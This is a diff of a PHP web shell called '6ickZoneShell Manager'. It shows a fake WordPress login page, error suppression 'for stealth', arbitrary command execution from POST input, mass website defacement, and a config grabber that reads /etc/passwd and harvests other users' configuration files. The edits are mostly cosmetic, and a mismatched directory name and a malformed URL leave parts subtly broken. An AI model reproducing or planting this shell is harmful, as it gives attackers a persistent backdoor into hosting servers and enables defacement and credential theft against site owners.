@@ -2,30 +2,29 @@
 /**
             * 6ickZoneShell Manager by 0x6ick x Nyx6st | Copyright 2025 by 6ickwhispers@gmail.com
           **/
-error_reporting(0);
-set_time_limit(0);
-session_start();
+error_reporting(0); // Suppress all errors for stealth
+session_start(); // Session is required for login
 @ini_set('output_buffering', 0);
 @ini_set('display_errors', 0);
-ini_set('memory_limit', '256M');
+ini_set('memory_limit', '256M'); // Increased memory limit for potential heavier tasks
 header('Content-Type: text/html; charset=UTF-8');
 
 // ob_end_clean(); // Jika ada masalah header, bisa diaktifkan kembali.
 // --- END ---
 // --- CONFIG ---
-$password = "login"; // <<< GANTI INI DENGAN PASSWORD ANDA su!
+$password = "your_strong_password_here"; // <<< GANTI INI DENGAN PASSWORD ANDA su!
 $title = " 6ickZoneShell Manager";
 $author = "0x6ick x Nyx6st"; // gausah di ganti kntl
 $theme_bg = "black";
-$theme_fg = "#00FFFF";
-$theme_highlight = "#00FFD1";
-$theme_link = "#00FFFF"; //
-$theme_link_hover = "#FFFFFF";
-$theme_border_color = "#00FFFF";
-$theme_table_header_bg = "#191919";
-$theme_table_row_hover = "#333333";
+$theme_fg = "#00FFFF"; // Pure Aqua/Cyan
+$theme_highlight = "#00FFD1"; // Slightly different shade for highlight
+$theme_link = "#00FFFF"; // Pure Aqua/Cyan
+$theme_link_hover = "#FFFFFF"; // White on hover
+$theme_border_color = "#00FFFF"; // Pure Aqua/Cyan
+$theme_table_header_bg = "#191919"; // Dark grey
+$theme_table_row_hover = "#333333"; // Darker grey on hover
 $theme_input_bg = "black";
-$theme_input_fg = "#00FFFF";
+$theme_input_fg = "#00FFFF"; // Aqua for input text
 $font_family = "'Kelly Slab', cursive";
 $message_success_color = "#00CCFF"; // A slightly darker/different aqua for success messages
 $message_error_color = "red"; // Red for errors (strong contrast)
@@ -180,7 +179,7 @@ if (!isset($_SESSION['loggedin']) || $_SESSION['loggedin'] !== true) {
         </head>
         <body class="login wp-core-ui">
             <div id="login">
-                <h1><a href="https://0x6ick.zone.id/" tabindex="-1">WordPress</a></h1>
+                <h1><a href="https:/0x6ick.zone.id/" tabindex="-1">WordPress</a></h1>
                 ' . $login_error_message . '
                 <form name="loginform" id="loginform" action="" method="post">
                     <p>
@@ -189,7 +188,7 @@ if (!isset($_SESSION['loggedin']) || $_SESSION['loggedin'] !== true) {
                     </p>
                     <p>
                         <label for="user_pass">Password</label>
-                        <input type="password" name="wordpress" id="user_pass" class="input" value="" size="20" autocomplete="current-password">
+                        <input type="password" name="shell_password" id="user_pass" class="input" value="" size="20" autocomplete="current-password">
                     </p>
                     <p class="forgetmenot"><input name="rememberme" type="checkbox" id="rememberme" value="forever"><label for="rememberme">Remember Me</label></p>
                     <p class="submit">
@@ -197,7 +196,7 @@ if (!isset($_SESSION['loggedin']) || $_SESSION['loggedin'] !== true) {
                     </p>
                 </form>
                 <p id="nav">
-                    <a href="https://0x6ick.zone.id/">Lost your password?</a> &bull;
+                    <a href="https://wordpress.org/">Lost your password?</a> &bull;
                     <a href="https://wordpress.org/">WordPress.org</a>
                 </p>
                 <p id="backtoblog">
@@ -341,7 +340,7 @@ if(isset($_POST['start_mass_deface'])) {
                 if ($dirb === '.' || $dirb === '..') continue;
                 $dirc = "$dir_current/$dirb";
                 $lokasi = $dirc.'/'.$namafile;
-                // Safety check: Ensure operation is within the user-specified $allowed_base_dir_for_deface
+                // Modified Safety check: Ensure operation is within the user-specified $allowed_base_dir_for_deface
                 if (strpos(realpath($dirc), $allowed_base_dir_for_deface) !== 0) { // Check if subdirectory is outside the allowed base
                     $results_arr .= "[<font color=red>SKIPPED</font>] " . htmlspecialchars($dirc) . " (outside target base path for mass deface)<br>";
                     continue;
@@ -369,7 +368,7 @@ if(isset($_POST['start_mass_deface'])) {
                 if ($dirb === '.' || $dirb === '..') continue;
                 $dirc = "$dir_current/$dirb";
                 $lokasi = $dirc.'/'.$namafile;
-                // Safety check: Ensure operation is within the user-specified $allowed_base_dir_for_deface
+                // Modified Safety check: Ensure operation is within the user-specified $allowed_base_dir_for_deface
                  if (strpos(realpath($dirc), $allowed_base_dir_for_deface) !== 0) { // Check if subdirectory is outside the allowed base
                     $results_arr .= "[<font color=red>SKIPPED</font>] " . htmlspecialchars($dirc) . " (outside target base path for mass deface)<br>";
                     continue;
@@ -405,7 +404,7 @@ if(isset($_POST['do_cmd'])){
     $cmd_output = exe($_POST['cmd_input']);
 }
 
-// File/Folder Operations (chmod, rename, edit, create)
+// File/Folder Operations (delete, chmod, rename, edit, create)
 // These are triggered by 'opt_action' via POST, and 'option' GET parameter
 if(isset($_GET['option']) && isset($_POST['path_target']) && isset($_POST['opt_action'])){
     $target_full_path = $_POST['path_target']; // Direct path for operations
@@ -602,8 +601,8 @@ if(isset($_POST['start_config_grab'])){
             $_SESSION['feature_output'] = "<font color=red>Gagal membaca /etc/passwd. Periksa izin.</font>";
         } else {
             $grab_config_output_temp = "";
-            @mkdir("6ickZone_grabbed", 0777); // Changed directory name
-            @chdir("6ickZone_grabbed");
+            @mkdir("configs_6ickZone_grabbed", 0777); // Changed directory name
+            @chdir("configs_grabbed_by_0x6ick");
             
             preg_match_all('/(.*?):x:/', $etc_passwd_content, $user_config);
             foreach($user_config[1] as $user_name_found) { // Changed var name from $user_sanrei
@@ -632,7 +631,7 @@ if(isset($_POST['start_config_grab'])){
             if (empty($grab_config_output_temp)) {
                 $grab_config_output_temp = "<font color=red>Tidak ada konfigurasi yang ditemukan.</font>";
             } else {
-                $grab_config_output_temp .= "<br><font color=lime>Konfigurasi disimpan di folder '6ickZone_grabbed' di direktori shell.</font>";
+                $grab_config_output_temp .= "<br><font color=lime>Konfigurasi disimpan di folder 'configs_grabbed_by_0x6ick' di direktori shell.</font>";
             }
             @chdir($path); // Return to original directory
             $_SESSION['feature_output'] = $grab_config_output_temp;
@@ -1182,7 +1181,7 @@ if (isset($_SESSION['feature_output']) && !empty($_SESSION['feature_output'])) {
   </tr>
 </table>
 <div class="main-menu">
-    <a href="?action=Home" onclick="return confirm('6ickZoneShell Manager\nby 0x6ick x Nyx6st\nMass deface tools by Indoxploit\nUse WP Login from GitHub\nBlog: 0x6ick.my.id / 0x6ickblogspot.com\nGitHub: github.com/6ickzone\n© 2025 - 6ickwhispers@gmail.com\nAfter you know this, will you go home?');">Home</a> |
+    <a href="?action=about" onclick="return confirm('6ickZoneShell Manager\nby 0x6ick x Nyx6st\nMass deface tools by Indoxploit\nUse WP Login from GitHub\nBlog: 0x6ick.my.id / 0x6ickblogspot.com\nGitHub: github.com/6ickzone\n© 2025 - 6ickwhispers@gmail.com\nAfter you know this, will you go home?');">About</a> |
     <a href="?path=<?php echo urlencode($path); ?>&action=cmd">Command</a> |
     <a href="?path=<?php echo urlencode($path); ?>&action=upload_form">Upload</a> |
     <a href="?path=<?php echo urlencode($path); ?>&action=mass_deface_form">Mass Deface</a> |
@@ -1480,7 +1479,7 @@ if (isset($_GET['action'])) {
             echo '</div>';
             break;
         case 'delete': // New: Delete handler using GET
-            // !!! Awokwok gjdi !!!
+            // !!! Awokwok gajadi !!!
             $show_file_list = false; // Tetap set false agar tidak kembali ke file listing
             echo '<div class="section-box">';
             echo '<p style="color:red; text-align:center;">Fitur Delete Dinonaktifkan.</p>';
@@ -1641,6 +1640,6 @@ if ($show_file_list) {
 </center>
 <br><br>
 <hr style="border-top: 1px solid <?php echo $theme_border_color; ?>; width: 95%; max-width: 900px; margin: 15px auto;">
-<center><font color="#fff" size="2px"><b>Coded With &#x1f497; by <font color="#7e52c6"> <?php echo $author; ?> </font></b></center>
+<center><font color="#fff" size="2px"><b>Coded With &#x1f497; by <font color="#ff4da6"> <?php echo $author; ?> </font></b></center>
 </body>
 </html>
